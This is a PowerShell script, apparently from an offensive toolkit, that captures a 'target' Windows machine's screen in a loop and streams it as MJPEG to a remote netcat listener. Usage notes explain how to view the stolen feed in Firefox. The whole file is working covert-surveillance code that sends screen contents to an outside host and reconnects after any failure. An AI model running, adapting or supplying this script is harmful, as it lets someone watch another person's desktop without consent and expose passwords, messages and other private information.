<#
===================== beigeworm's Netcat Screenshare ======================

SYNOPSIS
Starts a video stream of the desktop to a netcat session (the output is viewed in a browser.)

SETUP
Change "IP_ADDRESS_OR_DOMAIN_HERE"

USAGE
Run script on target Windows system.
On a Linux box use this command > nc -lvnp 9000 | nc -lvnp 8080
Then in a firefox browser goto  > http://localhost:8080

(Firefox is the only browser that supports the codec for the video stream..)
#>

#================================ CHANGE THESE ===============================
$IP = "IP_ADDRESS_OR_DOMAIN_HERE"
$PORT = "9000"
#=============================================================================

while ($true){
try{
    Add-Type -AssemblyName System.Windows.Forms
    [System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream
    $socket = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
    $socket.Connect($IP,$PORT)

    function SendResponse($sock, $string){
        if ($sock.Connected){
            $bytesSent = $sock.Send($string)
            if ( $bytesSent -eq -1 ){}}}

    function SendStrResponse($sock, $string){
        if ($sock.Connected){
            $bytesSent = $sock.Send(
            [text.Encoding]::Ascii.GetBytes($string))
            if ( $bytesSent -eq -1 ){}}}

    function SendHeader([net.sockets.socket] $sock,$length,$statusCode = "200 OK",$mimeHeader="text/html",$httpVersion="HTTP/1.1"){
        $response = "HTTP/1.1 $statusCode`r`n" + "Content-Type: multipart/x-mixed-replace; boundary=--boundary`r`n`n"
        SendStrResponse $sock $response}
        SendHeader $socket

    while ($True){
        $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
        $g = [System.Drawing.Graphics]::FromImage($b)
        $g.CopyFromScreen((New-Object System.Drawing.Point(0,0)), (New-Object System.Drawing.Point(0,0)), $b.Size)
        $g.Dispose()
        $MemoryStream.SetLength(0)
        $b.Save($MemoryStream, ([system.drawing.imaging.imageformat]::jpeg))
        $b.Dispose()
        $length = $MemoryStream.Length
        [byte[]] $Bytes = $MemoryStream.ToArray()
        $str = "`n`n--boundary`n" +
        "Content-Type: image/jpeg`n" +
        "Content-Length: $length`n`n"
        SendStrResponse $socket $str
        SendResponse $socket $Bytes
    }
$MemoryStream.Close()
}catch{Write-Error $_}}

